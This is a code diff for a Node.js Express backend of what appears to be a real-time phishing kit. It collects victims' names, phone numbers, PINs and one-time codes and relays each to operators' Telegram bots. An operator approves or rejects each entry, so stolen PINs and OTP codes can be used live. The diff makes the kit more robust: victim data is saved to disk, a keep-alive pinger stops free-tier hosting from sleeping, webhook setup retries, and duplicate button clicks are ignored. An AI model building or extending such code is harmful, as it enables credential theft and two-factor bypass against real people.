@@ -3,17 +3,48 @@ const express = require('express');
 const axios = require('axios');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
+const fs = require('fs');
+const http = require('http');
+const https = require('https');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const DOMAIN = process.env.BACKEND_DOMAIN || `http://localhost:${PORT}`;
 
-// ---------- In‑memory stores ----------
-const pendingDetails = {};
-const pendingCodes = {};
-const requestBotMap = {};
+// ---------- In-memory stores (persisted to disk) ----------
+let pendingDetails = {};
+let pendingCodes = {};
+let requestBotMap = {};
 
-// ---------- Multi‑bot discovery ----------
+const DATA_FILE = path.join(__dirname, 'data.json');
+
+// Load persisted data on boot
+try {
+    if (fs.existsSync(DATA_FILE)) {
+        const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+        pendingDetails = saved.pendingDetails || {};
+        pendingCodes   = saved.pendingCodes   || {};
+        requestBotMap  = saved.requestBotMap  || {};
+        console.log('💾 Restored pending requests from disk');
+    }
+} catch (e) {
+    console.error('Failed to load data.json:', e.message);
+}
+
+function persist() {
+    try {
+        fs.writeFileSync(DATA_FILE, JSON.stringify({
+            pendingDetails, pendingCodes, requestBotMap
+        }));
+    } catch (e) {
+        console.error('Persist failed:', e.message);
+    }
+}
+
+// Double-click protection
+const processedCallbacks = new Set();
+
+// ---------- Multi-bot discovery ----------
 const bots = [];
 Object.keys(process.env).forEach(key => {
     const match = key.match(/^BOT(\d+)_TOKEN$/);
@@ -46,6 +77,7 @@ async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
             chat_id: bot.chatId,
             text,
+            parse_mode: 'Markdown',
             reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
         });
     } catch (err) {
@@ -53,27 +85,77 @@ async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
     }
 }
 
-async function answerCallback(bot, callbackId) {
+async function answerCallback(bot, callbackId, text = '') {
     try {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
-            callback_query_id: callbackId
+            callback_query_id: callbackId,
+            text
         });
     } catch (err) {
         console.error(err.response?.data || err.message);
     }
 }
 
-async function setWebhook(bot) {
+async function editTelegramMessage(bot, chatId, messageId, text, inlineKeyboard = null) {
     try {
-        const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
-        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
-        console.log(`✅ Webhook set for ${bot.botId}`);
+        const payload = {
+            chat_id: chatId,
+            message_id: messageId,
+            text,
+            parse_mode: 'Markdown'
+        };
+        // null = remove buttons entirely
+        payload.reply_markup = { inline_keyboard: inlineKeyboard || [] };
+
+        await axios.post(
+            `https://api.telegram.org/bot${bot.botToken}/editMessageText`,
+            payload
+        );
     } catch (err) {
-        console.error(`❌ Webhook failed for ${bot.botId}:`, err.response?.data || err.message);
+        const desc = err.response?.data?.description || err.message;
+        if (!desc.includes('message is not modified')) {
+            console.error('editMessageText error:', desc);
+        }
     }
 }
 
+async function setWebhook(bot, retries = 5) {
+    const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
+    for (let i = 0; i < retries; i++) {
+        try {
+            const { data } = await axios.get(
+                `https://api.telegram.org/bot${bot.botToken}/setWebhook`,
+                { params: { url: webhookUrl, drop_pending_updates: false } }
+            );
+            if (data.ok) {
+                console.log(`✅ Webhook set for ${bot.botId}: ${webhookUrl}`);
+                return;
+            }
+            throw new Error(JSON.stringify(data));
+        } catch (err) {
+            console.error(`❌ Webhook attempt ${i + 1} failed for ${bot.botId}:`,
+                err.response?.data || err.message);
+            await new Promise(r => setTimeout(r, 3000));
+        }
+    }
+}
+
+// ---------- Keep-Alive Pinger (prevents Render free-tier sleep) ----------
+function keepAlive() {
+    const url = `${DOMAIN}/health`;
+    const client = url.startsWith('https') ? https : http;
+    client.get(url, (res) => {
+        console.log(`💓 Keep-alive ping: ${res.statusCode}`);
+        res.resume();
+    }).on('error', (err) => {
+        console.error('💓 Keep-alive error:', err.message);
+    });
+}
+setInterval(keepAlive, 14 * 60 * 1000);
+
 // ---------- Routes ----------
+app.get('/health', (req, res) => res.status(200).send('OK'));
+
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.status(404).send('Invalid bot link');
@@ -93,6 +175,7 @@ app.post('/submit-details', (req, res) => {
     const requestId = uuidv4();
     pendingDetails[requestId] = { approved: null, name, phone, pin, botId };
     requestBotMap[requestId] = botId;
+    persist();
 
     const message = `🔐 *Nova solicitação de detalhes*\n\n` +
                     `👤 *Nome:* ${name}\n` +
@@ -103,14 +186,6 @@ app.post('/submit-details', (req, res) => {
         { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
         { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
     ]]);
-
-    // ❌ AUTO‑APPROVAL REMOVED – admin must click a button
-    // setTimeout(() => {
-    //     if (pendingDetails[requestId] && pendingDetails[requestId].approved === null) {
-    //         pendingDetails[requestId].approved = true;
-    //         console.log(`✅ Auto‑approved details ${requestId}`);
-    //     }
-    // }, 30000);
 
     res.json({ requestId });
 });
@@ -130,6 +205,7 @@ app.post('/submit-code', (req, res) => {
     const requestId = uuidv4();
     pendingCodes[requestId] = { approved: null, name, phone, code, botId };
     requestBotMap[requestId] = botId;
+    persist();
 
     const message = `🔑 *Verificação de código*\n\n` +
                     `👤 *Nome:* ${name}\n` +
@@ -140,14 +216,6 @@ app.post('/submit-code', (req, res) => {
         { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
         { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
     ]]);
-
-    // ❌ AUTO‑APPROVAL REMOVED – admin must click a button
-    // setTimeout(() => {
-    //     if (pendingCodes[requestId] && pendingCodes[requestId].approved === null) {
-    //         pendingCodes[requestId].approved = true;
-    //         console.log(`✅ Auto‑approved code ${requestId}`);
-    //     }
-    // }, 30000);
 
     res.json({ requestId });
 });
@@ -166,21 +234,63 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const cb = req.body.callback_query;
     if (!cb) return res.sendStatus(200);
 
-    const [action, requestId] = cb.data.split(':');
+    // Double-click protection
+    if (processedCallbacks.has(cb.id)) return res.sendStatus(200);
+    processedCallbacks.add(cb.id);
+    setTimeout(() => processedCallbacks.delete(cb.id), 10 * 60 * 1000);
+
+    const [action, requestId] = (cb.data || '').split(':');
+    const messageId = cb.message?.message_id;
+    const chatId    = cb.message?.chat?.id;
     let feedback = '';
+    let statusLine = '';
 
     if (action === 'pin_ok') {
-        if (pendingDetails[requestId]) pendingDetails[requestId].approved = true;
-        feedback = '✅ PIN approved – user can proceed to OTP.';
+        if (pendingDetails[requestId]) {
+            pendingDetails[requestId].approved = true;
+            persist();
+            feedback = '✅ PIN approved – user can proceed to OTP.';
+            statusLine = '\n\n_✅ Approved by admin_';
+        } else {
+            feedback = `⚠️ Request not found (server may have restarted).`;
+            statusLine = '\n\n_⚠️ Request expired_';
+        }
     } else if (action === 'pin_bad') {
-        if (pendingDetails[requestId]) pendingDetails[requestId].approved = false;
-        feedback = '❌ PIN rejected – user will be notified.';
+        if (pendingDetails[requestId]) {
+            pendingDetails[requestId].approved = false;
+            persist();
+            feedback = '❌ PIN rejected – user will be notified.';
+            statusLine = '\n\n_❌ Rejected by admin_';
+        } else {
+            feedback = `⚠️ Request not found.`;
+            statusLine = '\n\n_⚠️ Request expired_';
+        }
     } else if (action === 'code_ok') {
-        if (pendingCodes[requestId]) pendingCodes[requestId].approved = true;
-        feedback = '✅ Code approved – user redirected to success.';
+        if (pendingCodes[requestId]) {
+            pendingCodes[requestId].approved = true;
+            persist();
+            feedback = '✅ Code approved – user redirected to success.';
+            statusLine = '\n\n_✅ Approved by admin_';
+        } else {
+            feedback = `⚠️ Code request not found.`;
+            statusLine = '\n\n_⚠️ Request expired_';
+        }
     } else if (action === 'code_bad') {
-        if (pendingCodes[requestId]) pendingCodes[requestId].approved = false;
-        feedback = '❌ Code rejected – user can retry.';
+        if (pendingCodes[requestId]) {
+            pendingCodes[requestId].approved = false;
+            persist();
+            feedback = '❌ Code rejected – user can retry.';
+            statusLine = '\n\n_❌ Rejected by admin_';
+        } else {
+            feedback = `⚠️ Code request not found.`;
+            statusLine = '\n\n_⚠️ Request expired_';
+        }
+    }
+
+    // 🔥 Edit original message: append status + REMOVE buttons
+    if (messageId && chatId && statusLine) {
+        const originalText = cb.message.text || '';
+        await editTelegramMessage(bot, chatId, messageId, originalText + statusLine, null);
     }
 
     if (feedback) await sendTelegramMessage(bot, `📝 *Feedback:*\n${feedback}`);
@@ -191,6 +301,11 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 // ---------- Start server ----------
 async function init() {
     for (const bot of bots) await setWebhook(bot);
-    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+    app.listen(PORT, () => {
+        console.log(`🚀 Server running on port ${PORT}`);
+        console.log(`🌐 Domain: ${DOMAIN}`);
+        // First ping 30s after boot
+        setTimeout(keepAlive, 30 * 1000);
+    });
 }
 init();
